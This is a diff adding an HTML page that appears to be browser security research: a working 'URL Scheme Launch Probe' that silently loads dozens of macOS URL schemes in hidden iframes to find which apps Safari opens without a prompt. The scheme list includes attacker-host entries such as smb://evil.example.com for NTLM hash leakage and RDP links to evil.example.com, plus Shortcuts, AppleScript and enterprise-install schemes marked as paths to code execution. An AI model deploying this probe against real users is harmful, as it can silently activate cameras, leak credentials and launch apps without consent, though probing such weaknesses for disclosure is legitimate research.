@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>URL Scheme Launch Probe — macOS Safari</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;color:#c9d1d9;padding:12px;font-size:14px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:15px;max-width:760px;margin:0 auto 12px}
+h2{font-size:16px;color:#58a6ff;margin-bottom:3px}
+h3{font-size:12px;text-transform:uppercase;letter-spacing:.05em;color:#8b949e;margin:14px 0 5px}
+.sub{font-size:11px;color:#8b949e;line-height:1.55;margin-bottom:10px}
+.verdict{border-radius:10px;padding:13px;margin:10px 0;font-weight:700;text-align:center;font-size:13px;line-height:1.5}
+.v-bad{background:#2d1214;color:#ff7b72}.v-ok{background:#0f5323;color:#7ee787}.v-wait{background:#21262d;color:#8b949e}.v-info{background:#3d2c00;color:#e3b341}
+.e{border:1px solid #21262d;border-left-width:3px;border-radius:6px;padding:8px 10px;margin:4px 0;font-size:12px;cursor:pointer}
+.e:hover{background:#1c2128}
+.e.launched{border-left-color:#f85149;background:#2d1214}
+.e.blocked{border-left-color:#3fb950;opacity:.7}
+.e.untested{border-left-color:#e3b341}
+.e .n{font-weight:650;display:flex;justify-content:space-between;align-items:center}
+.e .d{font-family:ui-monospace,monospace;font-size:11px;color:#8b949e;margin-top:2px}
+.tag{font-size:10px;padding:2px 6px;border-radius:4px;font-weight:600}
+.tag-crit{background:#f85149;color:#fff}.tag-high{background:#e3b341;color:#000}.tag-med{background:#30363d;color:#8b949e}
+.tag-launched{background:#f85149;color:#fff}.tag-blocked{background:#3fb950;color:#000}.tag-unknown{background:#21262d;color:#8b949e}
+button{border:none;border-radius:8px;padding:11px;font-size:13px;font-weight:600;color:#fff;background:#1f6feb;margin-top:7px;width:100%}
+button.alt{background:#30363d}button.danger{background:#c0202c}
+pre{background:#010409;border-radius:6px;padding:8px;font-size:10.5px;max-height:300px;overflow:auto;color:#8b949e;margin-top:8px;white-space:pre-wrap}
+.stats{display:flex;gap:12px;flex-wrap:wrap;margin:10px 0}
+.stat{background:#21262d;border-radius:8px;padding:8px 12px;text-align:center;min-width:80px}
+.stat .num{font-size:20px;font-weight:700}.stat .lbl{font-size:10px;color:#8b949e}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>URL Scheme Launch Probe</h2>
+  <p class="sub">Tests which macOS URL schemes Safari launches <b>without a confirmation prompt</b>
+  via <code>iframe src=</code> (the stealthiest injection method).
+  <br><br>Confirmed: <code>facetime://</code> and <code>tel://</code> launch via iframe without prompt.
+  This probes <b>every dangerous scheme</b> registered on macOS to find which others follow the same pattern.
+  <br><br>Detection: <code>window.blur</code> fires when an external app takes focus.
+  Each probe runs for 3s, then reports launched/blocked.</p>
+
+  <div class="stats" id="stats"></div>
+  <div class="verdict v-wait" id="verdict">idle</div>
+
+  <button class="danger" onclick="runAll()">Run ALL probes (sequential, 3s each)</button>
+  <button class="alt" onclick="runCategory('critical')">Critical impact only</button>
+  <button class="alt" onclick="runCategory('high')">High impact only</button>
+
+  <div id="out"></div>
+  <pre id="log"></pre>
+</div>
+
+<div id="sandbox" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden"></div>
+
+<script>
+const T0 = performance.now();
+const L = [];
+function lg(m) {
+  L.push(`[+${String(Math.round(performance.now()-T0)).padStart(5)}ms] ${m}`);
+  document.getElementById('log').textContent = L.slice(-60).join('\n');
+}
+
+const SCHEMES = [
+  {scheme:'shortcuts', url:'shortcuts://run-shortcut?name=TestShortcut', risk:'critical',
+   note:'Apple Shortcuts — can run shell scripts, access files, make HTTP requests. Web→RCE if no prompt.'},
+  {scheme:'shortcuts-production', url:'shortcuts-production://run-shortcut?name=TestShortcut', risk:'critical',
+   note:'Production variant of Shortcuts URL scheme.'},
+  {scheme:'workflow', url:'workflow://run-workflow?name=Test', risk:'critical',
+   note:'Legacy Automator workflow — predecessor to Shortcuts, can run shell commands.'},
+  {scheme:'applescript', url:'applescript://com.apple.scripteditor?action=new&script=display%20dialog%20%22test%22', risk:'critical',
+   note:'AppleScript — full system automation access if it can run scripts.'},
+  {scheme:'ssh', url:'ssh://localhost', risk:'high',
+   note:'Opens Terminal with SSH connection. Could connect to attacker-controlled server.'},
+  {scheme:'vnc', url:'vnc://localhost', risk:'high',
+   note:'Screen Sharing — remote desktop connection.'},
+  {scheme:'smb', url:'smb://evil.example.com/share', risk:'high',
+   note:'Mounts network share — could mount attacker-controlled SMB share, NTLM hash leak.'},
+  {scheme:'sftp', url:'sftp://localhost', risk:'high',
+   note:'SFTP connection via Terminal.'},
+  {scheme:'telnet', url:'telnet://localhost', risk:'high',
+   note:'Telnet connection — plaintext, attacker-controlled server sees all input.'},
+  {scheme:'x-apple.systempreferences', url:'x-apple.systempreferences://com.apple.preference.security', risk:'high',
+   note:'Opens specific System Settings pane. Could open Privacy/Security to social-engineer changes.'},
+  {scheme:'itms-services', url:'itms-services://?action=download-manifest&url=https://example.com/manifest.plist', risk:'high',
+   note:'Enterprise app installation — installs .ipa from attacker manifest.'},
+  {scheme:'zoommtg', url:'zoommtg://zoom.us/join?confno=1234567890', risk:'high',
+   note:'Auto-joins Zoom meeting. Camera+mic activate on join.'},
+  {scheme:'zoomus', url:'zoomus://zoom.us/join?confno=1234567890', risk:'high',
+   note:'Alternative Zoom scheme — same as zoommtg.'},
+  {scheme:'facetime', url:'facetime://test@example.com', risk:'high',
+   note:'CONFIRMED: launches without prompt. Camera preview activates.'},
+  {scheme:'facetime-audio', url:'facetime-audio://test@example.com', risk:'high',
+   note:'FaceTime audio call — mic activates on connect.'},
+  {scheme:'facetime-group', url:'facetime-group://test@example.com', risk:'high',
+   note:'Group FaceTime — camera activates.'},
+  {scheme:'facetime-open-link', url:'facetime-open-link://test@example.com', risk:'high',
+   note:'FaceTime link variant.'},
+  {scheme:'tel', url:'tel://+15551234567', risk:'medium',
+   note:'CONFIRMED: launches without prompt (control test).'},
+  {scheme:'imessage', url:'imessage://test@example.com', risk:'medium',
+   note:'Opens iMessage compose — could pre-fill message to attacker.'},
+  {scheme:'sms', url:'sms://+15551234567', risk:'medium',
+   note:'Opens Messages with number.'},
+  {scheme:'mailto', url:'mailto:test@example.com?subject=test&body=sensitive_data', risk:'medium',
+   note:'Opens mail compose — could exfiltrate via pre-filled body/attachments.'},
+  {scheme:'maps', url:'maps://?q=current+location', risk:'medium',
+   note:'Opens Maps — location tracking if it reveals current location.'},
+  {scheme:'slack', url:'slack://open', risk:'medium',
+   note:'Opens Slack — deeplinks could navigate to specific channels/messages.'},
+  {scheme:'discord', url:'discord://discord.com/channels/@me', risk:'medium',
+   note:'Opens Discord.'},
+  {scheme:'findmy', url:'findmy://items', risk:'medium',
+   note:'Opens Find My — reveals device locations.'},
+  {scheme:'notes', url:'notes://showNote?id=test', risk:'medium',
+   note:'Opens Notes app — could reveal note contents.'},
+  {scheme:'music', url:'music://play', risk:'low',
+   note:'Opens Music app.'},
+  {scheme:'photos-navigation', url:'photos-navigation://album', risk:'medium',
+   note:'Opens Photos with navigation — reveals photo library.'},
+  {scheme:'prefs', url:'prefs://privacy', risk:'medium',
+   note:'Opens Preferences/Settings.'},
+  {scheme:'ms-rd', url:'ms-rd://full%20address=s:evil.example.com', risk:'high',
+   note:'Microsoft Remote Desktop — connects to attacker RDP server.'},
+  {scheme:'rdp', url:'rdp://full%20address=s:evil.example.com', risk:'high',
+   note:'Remote Desktop Protocol — connects to attacker server.'},
+  {scheme:'deskcam', url:'deskcam://start', risk:'high',
+   note:'Unknown camera-related scheme — investigate.'},
+  {scheme:'diagnostics', url:'diagnostics://start', risk:'medium',
+   note:'System diagnostics — could reveal system info.'},
+];
+
+const results = {};
+let running = false;
+
+function renderEntry(s) {
+  const div = document.createElement('div');
+  div.className = 'e untested';
+  div.id = 'e-' + s.scheme;
+  div.innerHTML = `
+    <div class="n">
+      <span>${s.scheme}://</span>
+      <span class="tag tag-${s.risk}">${s.risk.toUpperCase()}</span>
+    </div>
+    <div class="d">${s.note}</div>
+    <div class="d" id="r-${s.scheme}" style="margin-top:4px;color:#58a6ff"></div>
+  `;
+  div.onclick = () => testOne(s);
+  return div;
+}
+
+function renderAll() {
+  const out = document.getElementById('out');
+  out.innerHTML = '';
+  const groups = {critical:[], high:[], medium:[], low:[]};
+  SCHEMES.forEach(s => groups[s.risk].push(s));
+  for (const [risk, items] of Object.entries(groups)) {
+    if (!items.length) continue;
+    const h = document.createElement('h3');
+    h.textContent = `${risk} impact (${items.length})`;
+    out.appendChild(h);
+    items.forEach(s => out.appendChild(renderEntry(s)));
+  }
+}
+
+async function testOne(s) {
+  if (running) return;
+  return probe(s);
+}
+
+function probe(s) {
+  return new Promise(resolve => {
+    const sandbox = document.getElementById('sandbox');
+    const rdiv = document.getElementById('r-' + s.scheme);
+    const ediv = document.getElementById('e-' + s.scheme);
+    let launched = false;
+
+    lg(`probing ${s.scheme}://`);
+    rdiv.textContent = 'testing...';
+
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = 'width:1px;height:1px;border:0';
+    iframe.src = s.url;
+
+    const onBlur = () => {
+      launched = true;
+      const ms = Math.round(performance.now() - t0);
+      results[s.scheme] = {launched: true, ms, method: 'iframe'};
+      rdiv.innerHTML = `<span style="color:#ff7b72;font-weight:700">LAUNCHED in ${ms}ms — app opened without prompt!</span>`;
+      ediv.className = 'e launched';
+      lg(`${s.scheme}: LAUNCHED at +${ms}ms`);
+    };
+
+    window.addEventListener('blur', onBlur);
+    const t0 = performance.now();
+    sandbox.appendChild(iframe);
+
+    setTimeout(() => {
+      window.removeEventListener('blur', onBlur);
+      try { sandbox.removeChild(iframe); } catch(e) {}
+      if (!launched) {
+        results[s.scheme] = {launched: false, method: 'iframe'};
+        rdiv.innerHTML = `<span style="color:#7ee787">blocked — no app launched (3s timeout)</span>`;
+        ediv.className = 'e blocked';
+        lg(`${s.scheme}: blocked`);
+      }
+      updateStats();
+      resolve(results[s.scheme]);
+    }, 3000);
+  });
+}
+
+async function runAll() {
+  if (running) return;
+  running = true;
+  document.getElementById('verdict').className = 'verdict v-info';
+  document.getElementById('verdict').textContent = 'running...';
+  for (const s of SCHEMES) {
+    await probe(s);
+    await new Promise(r => setTimeout(r, 500));
+    window.focus();
+    await new Promise(r => setTimeout(r, 200));
+  }
+  running = false;
+  finalize();
+}
+
+async function runCategory(risk) {
+  if (running) return;
+  running = true;
+  const items = SCHEMES.filter(s => s.risk === risk);
+  document.getElementById('verdict').className = 'verdict v-info';
+  document.getElementById('verdict').textContent = `testing ${items.length} ${risk} schemes...`;
+  for (const s of items) {
+    await probe(s);
+    await new Promise(r => setTimeout(r, 500));
+    window.focus();
+    await new Promise(r => setTimeout(r, 200));
+  }
+  running = false;
+  finalize();
+}
+
+function updateStats() {
+  const launched = Object.values(results).filter(r => r.launched).length;
+  const blocked = Object.values(results).filter(r => !r.launched).length;
+  const total = SCHEMES.length;
+  const untested = total - launched - blocked;
+  document.getElementById('stats').innerHTML = `
+    <div class="stat"><div class="num" style="color:#ff7b72">${launched}</div><div class="lbl">LAUNCHED</div></div>
+    <div class="stat"><div class="num" style="color:#7ee787">${blocked}</div><div class="lbl">Blocked</div></div>
+    <div class="stat"><div class="num">${untested}</div><div class="lbl">Untested</div></div>
+    <div class="stat"><div class="num">${total}</div><div class="lbl">Total</div></div>
+  `;
+}
+
+function finalize() {
+  const launched = Object.entries(results).filter(([k,v]) => v.launched);
+  const critLaunched = launched.filter(([k]) => SCHEMES.find(s=>s.scheme===k)?.risk === 'critical');
+  const highLaunched = launched.filter(([k]) => SCHEMES.find(s=>s.scheme===k)?.risk === 'high');
+  const v = document.getElementById('verdict');
+
+  if (critLaunched.length) {
+    v.className = 'verdict v-bad';
+    v.innerHTML = `${critLaunched.length} CRITICAL scheme(s) launched without prompt:<br>` +
+      critLaunched.map(([k]) => `<b>${k}://</b>`).join(', ') +
+      `<br><span style="font-weight:400;font-size:12px">${launched.length} total schemes launched. ${highLaunched.length} high-impact.</span>`;
+  } else if (highLaunched.length) {
+    v.className = 'verdict v-bad';
+    v.innerHTML = `${highLaunched.length} HIGH-impact scheme(s) launched without prompt:<br>` +
+      highLaunched.map(([k]) => `<b>${k}://</b>`).join(', ');
+  } else if (launched.length) {
+    v.className = 'verdict v-info';
+    v.textContent = `${launched.length} scheme(s) launched: ${launched.map(([k])=>k).join(', ')}`;
+  } else {
+    v.className = 'verdict v-ok';
+    v.textContent = 'All tested schemes were blocked.';
+  }
+  updateStats();
+  lg('done — ' + launched.length + ' launched, ' + (Object.keys(results).length - launched.length) + ' blocked');
+}
+
+renderAll();
+updateStats();
+lg('ready — click a scheme to test individually, or run all');
+</script>
+</body>
+</html>
